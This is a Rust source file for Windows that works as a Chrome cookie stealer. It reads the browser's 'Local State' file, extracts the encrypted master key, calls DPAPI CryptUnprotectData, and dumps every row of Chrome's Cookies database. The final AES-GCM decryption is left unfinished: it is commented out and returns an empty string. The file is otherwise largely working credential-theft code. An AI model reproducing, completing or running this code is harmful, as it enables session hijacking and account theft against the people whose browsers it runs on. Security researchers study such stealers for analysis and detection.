use rusqlite::Connection;
use windows::core::PWSTR;
use windows::{Win32::Foundation::*, Win32::Security::*};
use std::ptr::null_mut;
use std::ptr::null;
use std::fs;
use std::env;
use std::path::Path;
use std::ffi::CString;
use windows::Win32::Security::Cryptography::{
    CryptStringToBinaryA, CRYPT_STRING_BASE64, CRYPT_INTEGER_BLOB, CryptUnprotectData,
};
use windows::Win32::System::Com::CoTaskMemFree;
use windows::Win32::System::Memory::{GlobalAlloc, GMEM_ZEROINIT};
use aes_gcm::Aes256Gcm;
use aes_gcm::KeyInit;
use aes_gcm::aead::Aead;

fn get_master_key(cipher: *mut u8, key_size: u32) {
    let mut data_in = CRYPT_INTEGER_BLOB {
        pbData: cipher,
        cbData: key_size,
    };

    let mut data_out: CRYPT_INTEGER_BLOB = unsafe { std::mem::zeroed() };

    let result = unsafe {
        CryptUnprotectData(
            &data_in,
            None, // ppszdatadescr
            None, // poptionalentropy
            None, // pvreserved
            None, // ppromptstruct
            0,    // dwflags
            &mut data_out
        )
    };

    if let Ok(_) = result {
        let output_size = (data_out.cbData * 4) + 1;
        let mut output = Vec::with_capacity(output_size as usize);
        
        for i in 0..data_out.cbData {
            let byte = unsafe { *(data_out.pbData.add(i as usize)) };
            output.extend(format!("\\x{:02x}", byte).as_bytes());
        }

        println!("Master key is: {}", String::from_utf8_lossy(&output));
    } else {
        eprintln!("Failed to unprotect data: {:?}", result.err());
    }
}


fn extract_key(data: &str) -> Option<String> {
    const PATTERN: &str = "\"encrypted_key\":\"";

    if let Some(mut start) = data.find(PATTERN) {
        start += PATTERN.len();

        if let Some(end) = data[start..].find("\"") {
            let key_data = &data[start..start + end];
            let key_len = key_data.len();

            // Allocate memory using GlobalAlloc
            let mem_ptr = unsafe { GlobalAlloc(GMEM_ZEROINIT, key_len + 1) }.unwrap();

            // Copy data into allocated memory
            let key_cstr = CString::new(key_data).unwrap();
            unsafe { std::ptr::copy_nonoverlapping(key_cstr.as_ptr(), mem_ptr.0 as *mut i8, key_len) };

            println!("Allocating {} bytes for the base64 key", key_len);

            // Convert pointer to string and return
            let extracted_key = unsafe { CString::from_raw(mem_ptr.0 as *mut i8) }.to_str().unwrap().to_string();
            return Some(extracted_key);
        } else {
            eprintln!("ERROR: end of encrypted key pattern not found");
        }
    } else {
        eprintln!("ERROR: Encrypted key pattern not found");
    }

    None
}

fn get_data_from_path() -> Result<String, std::io::Error> {
    let mut path = env::home_dir().unwrap_or_default();
    path.push(r"AppData\Local\Google\Chrome\User Data\Local State");

    fs::read_to_string(&path)
}

fn decrypt_cookie(key: &str, data: &str) -> String {
    let master = base64::decode(key).unwrap();
    let cookie = hex::decode(data).unwrap();

    let nonce = &cookie[3..15];
    let ciphertext = &cookie[15..(cookie.len() - 16)];
    let tag = &cookie[(cookie.len() - 16)..cookie.len()];

    println!("Key length: {}", master.len());
    println!("Master key decoded: {:?}", base64::decode(master));
    //err invalid length
    
    // let cipher = Aes256Gcm::new_from_slice(&master).expect("something happened");
    // let plaintext = cipher.decrypt(nonce.into(), ciphertext).unwrap();

    // return String::from_utf8(plaintext).unwrap();

    return "".to_owned();

}

fn dump_data(path: &str, key: &str, filter_opt: Option<&str>) {
    let filter = match filter_opt {
        Some(filter) => format!("WHERE host_key LIKE '%{}%'", filter),
        None => "".to_string(),
    };

    let conn = Connection::open(path).expect("Failed to open database");

    let mut stmt = conn.prepare(&format!(
        "SELECT host_key, name, hex(encrypted_value) FROM cookies {};",
        filter
    ))
    .unwrap();

    let rows = stmt.query_map([], |row| {
        let host_key: String = row.get(0)?;
        let name: String = row.get(1)?;
        let encrypted_value: String = row.get(2)?;
        let decrypted_value = decrypt_cookie(key, &encrypted_value);
        
        Ok((host_key, name, decrypted_value))
    }).unwrap();

    for row_result in rows {
        let (host_key, name, decrypted_value) = row_result.unwrap();
        println!("{}:{}={};", host_key, name, decrypted_value);
    }
}

fn main() {
    match get_data_from_path() {
        Ok(data) => {
            let data_str: &str = &data;
            // Do something with data_str
            //println!("{}", data_str);
            let base64_key = extract_key(&data).unwrap();

            println!("Chrome master key extracted: {}", &base64_key);

            let mut path = env::home_dir().unwrap_or_default();
            path.push(r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies");
        
            dump_data(path.to_str().unwrap(), &base64_key, None)
        },
        Err(e) => eprintln!("Failed to read the file: {}", e),
    }
}

